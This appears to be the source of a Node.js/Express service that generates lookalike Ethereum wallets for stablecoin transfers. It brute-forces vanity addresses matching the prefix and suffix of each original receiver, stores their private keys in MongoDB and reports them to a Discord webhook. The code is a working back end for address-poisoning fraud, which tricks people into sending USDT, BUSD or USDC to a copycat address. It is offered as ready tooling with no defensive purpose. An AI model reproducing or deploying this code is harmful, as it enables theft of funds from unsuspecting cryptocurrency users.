const express = require('express');
const cors = require('cors');
const { StoreUSDT, StoreBUSD, StoreUSDC } = require('./store.js');
const { Status } = require('./status.js');
const dotenv = require('dotenv');
const mongoose = require('mongoose');
const axios = require('axios');
const crypto = require('crypto');
const ethUtils = require('ethereumjs-util');
const { AddressList } = require('./addressList.js');
var ERRORS = {
  invalidHex: 'Invalid hex input',
};

dotenv.config();
const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(express.json());

const discordWebHook = process.env.DISCORD_HOOK;

var getRandomWallet = function () {
  var randbytes = crypto.randomBytes(32);
  var address = '0x' + ethUtils.privateToAddress(randbytes).toString('hex');
  return { address: address, privKey: randbytes.toString('hex') };
};
var isValidHex = function (hex) {
  if (!hex.length) return true;
  hex = hex.toUpperCase();
  var re = /^[0-9A-F]+$/g;
  return re.test(hex);
};
var isValidVanityWallet = function (
  wallet,
  input,
  suffix,
  isChecksum,
  isContract
) {
  var _add = wallet.address;
  if (isContract) {
    var _contractAdd = getDeterministicContractAddress(_add);
    _contractAdd = isChecksum
      ? ethUtils.toChecksumAddress(_contractAdd)
      : _contractAdd;
    wallet.contract = _contractAdd;
    return (
      _contractAdd.substring(2, input.length) == input &&
      _contractAdd.substring(42 - suffix.length) == suffix
    );
  }
  _add = isChecksum ? ethUtils.toChecksumAddress(_add) : _add;
  return (
    _add.substr(2, input.length) == input &&
    _add.substring(42 - suffix.length) == suffix
  );
};
var getVanityWallet = function (
  input = '',
  suffix = '',
  isChecksum = false,
  isContract = false,
  counter = function () {}
) {
  if (!isValidHex(input)) throw new Error(ERRORS.invalidHex);
  if (!isValidHex(suffix)) throw new Error(ERRORS.invalidHex);
  input = isChecksum ? input : input.toLowerCase();
  suffix = isChecksum ? suffix : suffix.toLowerCase();
  var _wallet = getRandomWallet();
  while (!isValidVanityWallet(_wallet, input, suffix, isChecksum, isContract)) {
    counter();
    _wallet = getRandomWallet(isChecksum);
  }
  if (isChecksum) _wallet.address = ethUtils.toChecksumAddress(_wallet.address);
  return _wallet;
};
var getDeterministicContractAddress = function (address) {
  return (
    '0x' +
    ethUtils
      .keccak256(ethUtils.rlp.encode([address, 0]))
      .slice(12)
      .toString('hex')
  );
};

app.get('/generate/:chain', async (req, res) => {
  try {
    const { chain } = req.params;
    //get status

    const status = await Status.findOne({});
    let currentStore = null;
    if (status) {
      currentStore = await StoreUSDT.findOne({
        originalReceiver: status.address,
      });
      if (status.chain === 'BUSD') {
        currentStore = await StoreBUSD.findOne({
          originalReceiver: status.address,
        });
      }
      if (status.chain === 'USDC') {
        currentStore = await StoreUSDC.findOne({
          originalReceiver: status.address,
        });
      }
    }
    let token = 'USDT';
    let store = await StoreUSDT.findOne({ generated: false });

    if (chain == 'busd') {
      store = await StoreBUSD.findOne({ generated: false });
      token = 'BUSD';
    }
    if (chain == 'usdc') {
      store = await StoreUSDC.findOne({ generated: false });
      token = 'USDC';
    }
    // check if similar address has been generated
    const add_exists = await AddressList.findOne({
      original: store.originalSender,
    });
    let info = null;
    if (add_exists != null) {
      await axios.post(discordWebHook, {
        content: `Using existing address for ${store.originalSender}`,
      });
      store.newReceiver = add_exists.generated;
      store.key = add_exists.key;
      store.generated = true;
      await store.save();
      info = `${token}: address: ${add_exists.generated} | private_key: ${add_exists.key}`;
    } else {
      
      const prefix = store.originalReceiver.substring(2, 5);
      const suffix = store.originalReceiver.substring(39);

      if ( currentStore !== null &&
        currentStore &&
        !currentStore.generated &&
        status.busy &&
        store.originalReceiver !== status.address
      )
        throw new Error('Generator is busy');
      status.busy = true;
      status.address = store.originalReceiver;
      status.chain = token;
      await status.save();
      try {
        await axios.post(discordWebHook, {
          content: `${token}: Generating duplicate for initial address: ${store.originalReceiver}`,
        });
      } catch (error) {
        console.log(error);
      }
      const response = getVanityWallet(prefix, suffix);
      store.newReceiver = response.address;
      store.key = response.privKey;
      store.generated = true;
      await store.save();
      info = `${token}: address: ${response.address} | private_key: ${response.privKey}`;
      const newAdd = AddressList.create({
        key: response.privKey,
        original: store.originalReceiver,
        generated: response.address
      })
      await newAdd.save();
    }
    status.busy = false;
    status.address = '';
    status.chain = '';
    await status.save();
    try {
      await axios.post(discordWebHook, { content: info });
    } catch (error) {
      console.log(error);
    }
    // }

    res.send('Updated Successfully');
  } catch (error) {
    res.status(400).send(error.message);
  }
});

app.get('/', (req, res) => {
  res.send('Generator is running...');
});

const start = async () => {
  if (!process.env.MONGO_URI) {
    throw new Error('MONGO_URI must be defined');
  }

  const PORT = process.env.PORT || 5000;
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log('Connected to MongoDB');
  } catch (error) {
    console.error(error);
    throw new Error('Error connecting to MongoDB');
  }

  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
  });
};

start();
